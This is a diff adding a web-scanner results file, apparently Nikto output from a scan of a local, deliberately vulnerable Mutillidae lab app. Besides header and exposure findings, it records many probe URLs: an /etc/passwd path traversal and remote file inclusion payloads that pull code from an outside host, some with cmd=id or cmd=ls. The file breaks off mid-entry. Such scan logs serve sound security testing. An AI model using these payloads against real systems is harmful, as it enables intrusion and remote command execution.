@@ -1,0 +1,1042 @@
+{
+    "host": "mutillidae.localhost",
+    "ip": "127.0.0.1",
+    "port": "80",
+    "banner": "Apache/2.4.56 (Debian)",
+    "vulnerabilities": [
+        {
+            "id": "95",
+            "references": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies",
+            "method": "GET",
+            "url": "",
+            "msg": "/: Cookie PHPSESSID created without the httponly flag."
+        },
+        {
+            "id": "95",
+            "references": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies",
+            "method": "GET",
+            "url": "",
+            "msg": "/: Cookie showhints created without the httponly flag."
+        },
+        {
+            "id": "999986",
+            "method": "GET",
+            "url": "",
+            "msg": "/: Retrieved x-powered-by header: PHP/8.2.5."
+        },
+        {
+            "id": "999957",
+            "references": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options",
+            "method": "GET",
+            "url": "",
+            "msg": "/: The anti-clickjacking X-Frame-Options header is not present."
+        },
+        {
+            "id": "999100",
+            "method": "GET",
+            "url": "",
+            "msg": "/: Uncommon header 'logged-in-user' found, with contents: ."
+        },
+        {
+            "id": "999103",
+            "references": "https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/",
+            "method": "GET",
+            "url": "",
+            "msg": "/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type."
+        },
+        {
+            "id": "999996",
+            "references": "https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt",
+            "method": "GET",
+            "url": "",
+            "msg": "/robots.txt: contains 6 entries which should be manually viewed."
+        },
+        {
+            "id": "999967",
+            "method": "LHWLSOCF",
+            "url": "",
+            "msg": "/: Web Server returns a valid response with junk HTTP methods which may cause false positives."
+        },
+        {
+            "id": "000560",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)."
+        },
+        {
+            "id": "750510",
+            "method": "GET",
+            "url": "",
+            "msg": "/phpinfo.php: Output from the phpinfo() function was found."
+        },
+        {
+            "id": "001384",
+            "references": "OSVDB-12184",
+            "method": "GET",
+            "url": "",
+            "msg": "/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings."
+        },
+        {
+            "id": "750500",
+            "method": "GET",
+            "url": "",
+            "msg": "/includes/: Directory indexing found."
+        },
+        {
+            "id": "001702",
+            "method": "GET",
+            "url": "",
+            "msg": "/includes/: This might be interesting."
+        },
+        {
+            "id": "750500",
+            "method": "GET",
+            "url": "",
+            "msg": "/passwords/: Directory indexing found."
+        },
+        {
+            "id": "001790",
+            "method": "GET",
+            "url": "",
+            "msg": "/passwords/: This might be interesting."
+        },
+        {
+            "id": "002989",
+            "references": "CWE-552",
+            "method": "GET",
+            "url": "",
+            "msg": "/phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information."
+        },
+        {
+            "id": "002989",
+            "references": "CWE-552",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information."
+        },
+        {
+            "id": "750500",
+            "method": "GET",
+            "url": "",
+            "msg": "/images/: Directory indexing found."
+        },
+        {
+            "id": "750500",
+            "method": "GET",
+            "url": "",
+            "msg": "/styles/: Directory indexing found."
+        },
+        {
+            "id": "999100",
+            "method": "GET",
+            "url": "",
+            "msg": "/README: Uncommon header 'tcn' found, with contents: choice."
+        },
+        {
+            "id": "003406",
+            "method": "GET",
+            "url": "",
+            "msg": "/README: README file found."
+        },
+        {
+            "id": "003854",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/?_CONFIG[files][functions_page]=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "003855",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/?npage=-1&content_dir=http://blog.cirt.net/rfiinc.txt%00&cmd=ls: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "003856",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/?npage=1&content_dir=http://blog.cirt.net/rfiinc.txt%00&cmd=ls: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "003857",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/?show=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005046",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?1=lol&PAGES[lol]=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005047",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?AML_opensite=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005048",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?AMV_openconfig=1&AMV_serverpath=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005049",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?CONFIG[MWCHAT_Libs]=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005050",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?ConfigDir=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005051",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?DIR_PLUGINS=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005052",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?G_JGALL[inc_path]=http://blog.cirt.net/rfiinc.txt%00: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005053",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?HomeDir=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005054",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?Lang=AR&Page=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005055",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?Madoa=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005056",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?RP_PATH=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005057",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?_REQUEST=&_REQUEST[option]=com_content&_REQUEST[Itemid=1&GLOBALS=&mosConfig_absolute_path=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005058",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?_REQUEST=&_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005059",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?abg_path=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005060",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?abs_path=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005061",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?abs_path=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005062",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?adduser=true&lang=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005063",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?adodb=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005064",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?ads_file=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005065",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?arquivo=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005066",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?back=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005067",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?base==http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005068",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?basePath=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005069",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?bibtexrootrel=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005070",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?blog_dc_path=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005071",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?blog_theme=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005072",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?body=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005073",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?class_path=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005074",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?classified_path=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005075",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?cms=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005076",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?config[\\"sipssys\\"]=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005077",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?config[root_ordner]=http://blog.cirt.net/rfiinc.txt?&cmd=id: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005078",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?config[root_ordner]=http://blog.cirt.net/rfiinc.txt?cmd=id: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005079",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?config_atkroot=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005080",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?configuration=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005081",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?custom_admin_path=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005082",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?dateiPfad=http://blog.cirt.net/rfiinc.txt?&cmd=ls: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005083",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?de=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005084",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?dept=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005085",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?do=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005086",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?exec=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005087",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?ext=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005088",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?faq_path=http://blog.cirt.net/rfiinc.txt?&cmd=id: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005089",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?file_Nikto[]=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005089",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?file_name[]=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005090",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?file_path=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005091",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?fileloc=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005092",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?from=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005093",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?func=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005094",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?function=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005095",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?function=custom&custom=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005096",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?gOo=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005097",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?gen=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005098",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?get=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005099",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?home_Nikto=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005099",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?home_name=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005100",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?ilang=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005101",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?inc_dir=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005102",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?inc_dir=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005103",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?includeDir=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005104",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?includeFooter=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005105",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?includesdir=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005106",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?insPath=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005107",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?lang=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005108",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?language=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005109",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?language=en&main_page=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005110",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?lizge=http://blog.cirt.net/rfiinc.txt?&cmd=ls: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005111",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?lng=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005112",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?load=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005113",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?loadpage=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005114",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?main_tabid=1&main_content=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005115",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?may=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005116",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?middle=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005117",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?mode=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005118",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?mode=http://blog.cirt.net/rfiinc.txt?&cmd=: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005119",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?modpath=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "750510",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php: Output from the phpinfo() function was found."
+        },
+        {
+            "id": "005120",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?module=PostWrap&page=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005121",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?mosConfig_absolute_path=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005122",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?news7[\\"functions\\"]=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005123",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?news_include_path=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005124",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?open=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005125",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?option=com_custompages&cpage=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005126",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?page=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005128",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?page=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005129",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?pagehttp://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005131",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?pageNikto=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005131",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?pagename=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005132",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?pager=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005133",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?pagina=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005134",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?path_to_folder=http://blog.cirt.net/rfiinc.txt?cmd=id: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005135",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?pg=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005136",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?pg=http://blog.cirt.net/rfiinc.txt?: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005137",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?phpbb_root_path=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005138",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
+            "msg": "/index.php?plugin=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list."
+        },
+        {
+            "id": "005139",
+            "references": "https://gist.github.com/mubix/5d269c686584875015a2",
+            "method": "GET",
+            "url": "",
